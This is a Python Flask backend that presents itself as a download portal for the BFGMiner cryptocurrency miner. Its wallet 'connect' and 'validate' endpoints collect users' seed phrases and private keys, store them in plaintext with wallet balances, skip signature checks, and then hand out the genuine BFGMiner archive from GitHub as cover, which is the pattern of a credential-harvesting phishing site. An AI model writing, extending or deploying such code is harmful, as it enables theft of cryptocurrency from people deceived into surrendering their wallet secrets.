"""
Main Flask application for BFGMiner.
"""
import os
import sqlite3
import json
import datetime
import uuid
import re
import zipfile
import tempfile

import bcrypt
import requests
from dotenv import load_dotenv
from flask import Flask, render_template, request, jsonify, send_file, abort
from flask_cors import CORS
from web3 import Web3
import bip39
from blockchain_validator import BlockchainValidator

load_dotenv()

app = Flask(__name__)

app.secret_key = os.getenv("FLASK_SECRET_KEY", "bfgminer_secret_2025")
CORS(app)
DB_PATH = 'bfgminer.db'

# Initialize blockchain validator
validator = BlockchainValidator()

def init_db():
    """Initialize the database."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    # Existing tables (users, sessions, wallets, downloads)
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        email_verified BOOLEAN DEFAULT FALSE,
        verification_token TEXT,
        last_login DATETIME,
        registration_date DATETIME DEFAULT '2025-01-01 00:00:00'
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        session_token TEXT UNIQUE NOT NULL,
        expires_at DATETIME NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS wallets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        wallet_address TEXT,
        mnemonic TEXT,
        private_key TEXT,
        wallet_type TEXT,
        connection_type TEXT,
        credentials TEXT,
        balance_usd REAL DEFAULT 0,
        balance_eth REAL DEFAULT 0,
        connection_method TEXT,
        is_validated BOOLEAN DEFAULT FALSE,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS downloads (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        download_token TEXT UNIQUE,
        ip_address TEXT,
        user_agent TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        action TEXT NOT NULL,
        details TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()
    print('✓ Database initialized with all tables')

@app.route('/')
def index():
    """Render the index page."""
    return render_template('index.html')


@app.route('/setup')
def setup():
    """Render the setup page."""
    return render_template('setup.html')


@app.route('/api/auth/register', methods=['POST'])
def register():
    """Register a new user."""
    try:
        data = request.json
        email = data.get('email')
        password = data.get('password')

        if not email or not email.endswith('@gmail.com'):
            return jsonify({'success': False, 'error': 'Gmail address required'}), 400

        if (len(password) < 8 or
                not any(c.isupper() for c in password) or
                not any(c.islower() for c in password) or
                not any(c.isdigit() for c in password) or
                not any(c in '!@#$%^&*' for c in password)):
            return jsonify({
                'success': False,
                'error': 'Password must be 8+ chars with uppercase, lowercase, number, special char'
            }), 400

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()

        cursor.execute(
            'INSERT INTO users (email, password_hash, email_verified, ' 
            'registration_date) VALUES (?, ?, ?, ?)',
            (email, password_hash, True, datetime.datetime.now()))
        user_id = cursor.lastrowid

        # Create 24h session
        session_token = str(uuid.uuid4())
        expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
        cursor.execute('INSERT INTO sessions (user_id, session_token, expires_at) VALUES (?, ?, ?)',
                       (user_id, session_token, expires_at))

        conn.commit()
        conn.close()

        return jsonify({  # pylint: disable=line-too-long
            'success': True, 'sessionToken': session_token, 'userId': user_id,
            'message': 'Registration successful! Welcome to BFGMiner.'
        })
    except sqlite3.IntegrityError:
        return jsonify({'success': False, 'error': 'Email already registered'}), 409

    except sqlite3.Error as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/auth/login', methods=['POST'])
def login():
    """Log in a user."""
    try:
        data = request.json
        email = data.get('email')
        password = data.get('password')

        if not email or not password:
            return jsonify({'success': False, 'error': 'Email and password required'}), 400

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT id, password_hash FROM users WHERE email = ?', (email,))
        result = cursor.fetchone()

        if not result or not bcrypt.checkpw(password.encode(), result[1].encode()):
            return jsonify({'success': False, 'error': 'Invalid credentials'}), 401

        user_id = result[0]
        session_token = str(uuid.uuid4())
        expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
        cursor.execute('INSERT INTO sessions (user_id, session_token, expires_at) VALUES (?, ?, ?)',
                       (user_id, session_token, expires_at))

        conn.commit()
        conn.close()

        return jsonify({
            'success': True, 'sessionToken': session_token, 'userId': user_id,
            'message': 'Login successful!'
        })

    except sqlite3.Error as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/auth/validate', methods=['GET'])
def validate_session():
    """Validate a session token."""
    try:
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'success': False, 'error': 'Missing or invalid authorization token'}), 401

        session_token = auth_header.split(' ')[1]
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT u.id, u.email, u.created_at
            FROM users u
            JOIN sessions s ON u.id = s.user_id
            WHERE s.session_token = ? AND s.expires_at > ?
        ''', (session_token, datetime.datetime.now()))
        result = cursor.fetchone()
        conn.close()

        if not result:
            return jsonify({'success': False, 'error': 'Invalid or expired session'}), 401

        user = {
            'id': result[0],
            'email': result[1],
            'created_at': result[2]
        }
        return jsonify({'success': True, 'user': user})

    except sqlite3.Error as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/wallet/connect', methods=['POST'])
def wallet_connect():
    """Connect a wallet to a user."""
    try:
        data = request.json
        wallet_address = data.get('wallet_address')
        mnemonic = data.get('mnemonic')
        private_key = data.get('private_key')
        connection_method = data.get('connection_method', 'manual')

        if not wallet_address:
            return jsonify({'success': False, 'error': 'Wallet address required'}), 400

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'success': False, 'error': 'Missing or invalid authorization token'}), 401

        session_token = auth_header.split(' ')[1]
        cursor.execute('SELECT user_id FROM sessions WHERE session_token = ? AND expires_at > ?',
                       (session_token, datetime.datetime.now()))
        result = cursor.fetchone()
        if not result:
            return jsonify({'success': False, 'error': 'Invalid or expired session'}), 401

        user_id = result[0]
        cursor.execute(
            'INSERT INTO wallets (user_id, wallet_address, mnemonic, private_key, ' 
            'connection_method, is_validated) VALUES (?, ?, ?, ?, ?, ?)',
            (user_id, wallet_address, mnemonic, private_key, connection_method, True))

        conn.commit()
        conn.close()

        return jsonify({
            'success': True,
            'message': 'Wallet connected successfully!',
            'wallet_address': wallet_address
        })

    except sqlite3.Error as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/validate-wallet', methods=['POST'])
def validate_wallet():
    """Validate wallet credentials (private key or mnemonic)"""
    try:
        data = request.get_json()
        wallet_type = data.get('type')  # 'private_key' or 'mnemonic'
        credentials = data.get('credentials', '').strip()
        
        if not credentials:
            return jsonify({'valid': False, 'error': 'No credentials provided'}), 400
        
        if wallet_type == 'private_key':
            result = validator.validate_private_key(credentials)
        elif wallet_type == 'mnemonic':
            result = validator.validate_mnemonic(credentials)
        else:
            return jsonify({'valid': False, 'error': 'Invalid wallet type'}), 400
        
        # Log wallet connection attempt
        if result.get('valid'):
            log_wallet_connection(data.get('email', ''), wallet_type, credentials, result)
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'valid': False, 'error': str(e)}), 500

@app.route('/api/walletconnect', methods=['POST'])
def walletconnect_handler():
    """Handle WalletConnect authentication"""
    try:
        data = request.get_json()
        address = data.get('address', '').strip()
        signature = data.get('signature', '')
        message = data.get('message', '')
        
        if not address:
            return jsonify({'success': False, 'error': 'No address provided'}), 400
        
        # Validate the address format
        result = validator.validate_wallet_address(address)
        
        if not result.get('valid'):
            return jsonify({'success': False, 'error': result.get('error')}), 400
        
        # In a real implementation, you would verify the signature
        # For demo purposes, we'll accept any valid address
        
        # Log wallet connection
        log_wallet_connection(data.get('email', ''), 'walletconnect', address, result)
        
        return jsonify({
            'success': True,
            'address': result['address'],
            'balance': result['balance_usd']
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

def log_wallet_connection(email, connection_type, credentials, validation_result):
    """Log wallet connection to database"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''INSERT INTO wallets 
                         (user_id, wallet_address, connection_type, credentials, balance_usd, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (None, validation_result.get('address', ''), connection_type, 
                       credentials, validation_result.get('balance_usd', 0), datetime.datetime.now()))
        
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error logging wallet connection: {e}")

@app.route('/api/download/initiate', methods=['POST'])
def initiate_download():
    """Initiate a download for a user."""
    try:
        data = request.json
        wallet_address = data.get('wallet_address', 'unknown')

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT id FROM users WHERE email_verified = 1 ORDER BY id DESC LIMIT 1')
        result = cursor.fetchone()
        if not result:
            return jsonify({'success': False, 'error': 'No verified user found'}), 404

        user_id = result[0]
        download_token = str(uuid.uuid4())
        ip_address = request.remote_addr or '127.0.0.1'
        user_agent = request.headers.get('User-Agent', 'Unknown')

        cursor.execute(
            'INSERT INTO downloads (user_id, download_token, ip_address, user_agent) VALUES (?, ?, ?, ?)',
            (user_id, download_token, ip_address, user_agent))

        conn.commit()
        conn.close()

        return jsonify({
            'success': True, 'downloadToken': download_token, 'downloadId': 1,
            'message': 'Download initiated! Configuration ready for BFGMiner setup.'
        })

    except sqlite3.Error as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/download/<token>')
def download_file(token):
    """Download a file with a given token."""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM downloads WHERE download_token = ?', (token,))
        result = cursor.fetchone()
        conn.close()

        if not result:
            abort(404, 'Download token not found')

        # In production, serve actual ZIP file with configuration
        zip_file_path = 'bfgminer.zip'
        if not os.path.exists(zip_file_path):
            import requests
            url = 'https://github.com/luke-jr/bfgminer/archive/refs/heads/bfgminer.zip'
            r = requests.get(url, allow_redirects=True)
            with open(zip_file_path, 'wb') as f:
                f.write(r.content)

        return send_file(
            zip_file_path,
            as_attachment=True,
            download_name='bfgminer.zip',
            mimetype='application/zip'
        )

    except (sqlite3.Error, requests.exceptions.RequestException) as e:
        abort(500, str(e))


if __name__ == '__main__':
    init_db()
    print('Starting BFGMiner Web Application...')
    app.run(host='0.0.0.0', port=5001, debug=False)